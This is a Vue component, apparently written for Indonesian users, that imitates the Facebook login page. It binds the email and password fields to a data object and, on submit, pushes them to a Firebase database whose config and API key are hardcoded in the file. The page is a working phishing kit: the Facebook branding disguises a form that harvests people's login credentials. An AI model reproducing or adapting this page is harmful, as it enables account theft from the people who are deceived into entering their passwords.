<template>
  <div id="app">
    <router-view></router-view>
      <div class="alert p-1 mb-5" role="alert" style="border-radius: 0; background: #2d3a97; font-size: 1.8rem; color: white">
        <b>Facebook</b>
      </div>
      <center>
      <div class="form-login">
        <form id="form" v-on:submit.prevent="addBook">
          <div class="form-group">
            <input type="email" id="bookTitle" placeholder="Nomor ponsel atau email" class="form-control" v-model="newBook.title" style="background: #ebebeb;">
            <input type="password" id="bookAuthor" placeholder="Kata sandi" class="form-control" v-model="newBook.author" style="background: #ebebeb;">
          </div>
          <div class="form-grup"> 
            <router-link to="/login.facebook.com/loading">
              <input type="submit" class="btn btn-primary" value="Masuk" style="width: 100%; background:blue;">
            </router-link>
          </div>
        </form><br><br>
        <div class="form-group">
          <button class="btn btn-success">Buat Akun Baru</button>          
        </div> 
        <a href="#">Lupa Kata Sandi?</a>
      </div>
      <div class="form mt-5">
        <div class="content-footer">
          <b>Bahasa Indonesia</b><br>
          <a href="#">English (US)</a><br>
          <a href="#">Polski</a><br>
          <a href="#">Espanyol</a>
        </div>
      </div>
      <div class="form">
        <div class="content-footer">
          <p>Facebook Inc.</p>
        </div>
      </div>
      <div class="form">
        <div class="content-footer">
          <a href="#">Deutsch</a><br>
          <a href="#">Turkce</a><br>
          <a href="#">Italiano</a>
        </div>
      </div>
      </center>
    <!-- <div class="panel panel-default">
      <div class="panel-heading">
        <h3>Books Lists</h3>
      </div>
      <div class="panel-body">
        <table class="table table-striped">
          <thead>
            <tr>
              <th>Title</th>
              <th>Author</th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="book in books" v-bind:key="book.id">
              <td><a v-bind:href="book.url">{{book.title}}</a></td>
              <td>{{book.author}}</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div> -->
  </div>
</template>

<script>
import * as firebase from 'firebase'

const config = {
    apiKey: "AIzaSyA-A9oz0v7l0vy7Iw57e4SJsbhPT37vWtU",
    authDomain: "vuefirebase-2c8a9.firebaseapp.com",
    databaseURL: "https://vuefirebase-2c8a9.firebaseio.com",
    projectId: "vuefirebase-2c8a9",
    storageBucket: "vuefirebase-2c8a9.appspot.com",
    messagingSenderId: "592247406970",
    appId: "1:592247406970:web:7b32262975a2deb47ed6c3"
}
let app = firebase.initializeApp(config)
let database = app.database()
let booksRef = database.ref('books')

export default {
  name: 'app',
  firebase: {
    books: booksRef
  },
  data () {
    return {
      newBook: {
        title: '',
        author: '',
        url: '',
      }
    }
  },
  methods: {
    addBook: function() {
      booksRef.push(this.newBook);
      this.newBook.title = '';
      this.newBook.author = '';
      this.newBook.url = '';
    }
  }
}
</script>

<style>
#app {
  font-family: 'Avenir', Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  color: #6e707e;
  text-align: center;
  margin-top: 0;
}

.form {
  display: inline-block;
}

.footer .content-footer b, .footer .content-footer a{
  display: block;
}

@media screen and (max-width: 600px) {
  .form-login {
    width: 65%;
  }
}

@media screen and (min-width: 1200px) {
  .form-login {
    width: 25%;
  }
}
</style>
